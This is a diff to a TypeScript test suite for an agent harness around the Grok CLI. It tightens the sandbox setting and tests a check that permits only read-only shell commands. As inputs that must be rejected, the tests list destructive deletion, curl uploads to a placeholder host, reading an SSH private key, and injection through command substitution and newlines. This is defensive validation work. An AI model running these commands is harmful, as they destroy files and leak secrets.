@@ -10,6 +10,7 @@ import {
   buildGrokAcpArgs,
   checkGrokMinimumVersion,
   grokShellPermissionTitle,
+  isGrokReadOnlyShellPermissionTitle,
   parseGrokVersion,
   resolveGrokCommand,
   tryResolveGrokCommand,
@@ -46,7 +47,7 @@ describe('buildGrokAcpArgs', () => {
       '--no-subagents',
       '--disable-web-search',
       '--sandbox',
-      'workspace',
+      'strict',
       '--permission-mode',
       'acceptEdits',
       '--model',
@@ -80,6 +81,36 @@ describe('grokShellPermissionTitle', () => {
     for (const command of ['', 'npm test\nrm -rf /', 'echo `whoami`', 'echo\0x']) {
       expect(() => grokShellPermissionTitle(command)).toThrow(/single-line command/i);
     }
+  });
+});
+
+describe('isGrokReadOnlyShellPermissionTitle', () => {
+  it('accepts the observed multi-command repository inspection and quoted search pipelines', () => {
+    expect(
+      isGrokReadOnlyShellPermissionTitle(
+        'Execute `git log --oneline -5 && git rev-parse HEAD && ls -la scripts/dogfood/ 2>/dev/null; head -50 scripts/dogfood/slice-1a.sh 2>/dev/null || true`',
+      ),
+    ).toBe(true);
+    expect(
+      isGrokReadOnlyShellPermissionTitle('Execute `rg -n "foo|bar" src | head -50`'),
+    ).toBe(true);
+  });
+
+  it.each([
+    'Execute `git status && rm -rf .`',
+    'Execute `git status && curl https://example.invalid/upload`',
+    'Execute `mkdir -p src/app/commands`',
+    'Execute `echo changed > output.txt`',
+    'Execute `cat /Users/example/.ssh/id_ed25519`',
+    'Execute `cat ../outside.txt`',
+    'Execute `rg --pre ./steal needle .`',
+    'Execute `git diff --ext-diff`',
+    'Execute `git log --output=history.txt`',
+    'Execute `git log $(curl https://example.invalid)`',
+    'Execute `git log & curl https://example.invalid`',
+    'Execute `npm run typecheck`',
+  ])('rejects unsafe or undeclared shell operation: %s', (operation) => {
+    expect(isGrokReadOnlyShellPermissionTitle(operation)).toBe(false);
   });
 });
 
